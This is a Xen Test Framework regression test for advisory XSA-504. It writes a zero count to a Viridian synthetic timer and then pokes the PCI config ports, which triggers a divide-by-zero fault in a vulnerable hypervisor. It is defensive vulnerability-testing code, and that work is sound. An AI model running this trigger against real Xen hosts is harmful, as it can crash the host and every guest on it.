/**
 * @file tests/xsa-504/main.c
 * @ref test-xsa-504
 *
 * @page test-xsa-504 XSA-504
 *
 * Advisory: [XSA-504](https://xenbits.xen.org/xsa/advisory-504.html)
 *
 * The logic to handle periodic Viridian STIMERs performs a division with an
 * unchecked user-controlled divisor value, that can be set to zero to cause
 * a #DE fault.
 *
 * @see tests/xsa-504/main.c
 */

#include <xtf.h>

const char test_title[] = "XSA-504";

/*
 * Synthetic timer configuration.
 */
union hv_stimer_config {
	uint64_t as_uint64;
	struct {
		uint64_t enable:1;
		uint64_t periodic:1;
		uint64_t lazy:1;
		uint64_t auto_enable:1;
		uint64_t apic_vector:8;
		uint64_t direct_mode:1;
		uint64_t reserved_z0:3;
		uint64_t sintx:4;
		uint64_t reserved_z1:44;
	};
};

#define HV_X64_MSR_STIMER0_CONFIG		0x400000B0
#define HV_X64_MSR_STIMER0_COUNT		0x400000B1

void test_main(void)
{
    union hv_stimer_config config = { 0 };
    config.enable = true;
    config.sintx = true;
    config.periodic = true;

    /* Write a count of 0. */
    wrmsr(HV_X64_MSR_STIMER0_COUNT, 0);
    /* Then enable the timer in periodic mode. */
    wrmsr(HV_X64_MSR_STIMER0_CONFIG, config.as_uint64);
    /*
     * Trigger an event that calls starts the viridian timer without stopping
     * it before. For that, we can trigger the ioreq server, which will pause
     * the domain, and unpausing it (as a part of ioreq response) will resume
     * the viridian timer, triggering the vulnerability.
     *
     * To do so, we read PCI Configuration Space for 0000:00:00.0 offset 0
     * which will trigger the ioreq server.
     */
    outl(0x80000000, 0xCF8);
    inl(0xCFC);

    xtf_success("Success: Probably not vulnerable to XSA-504\n");
}
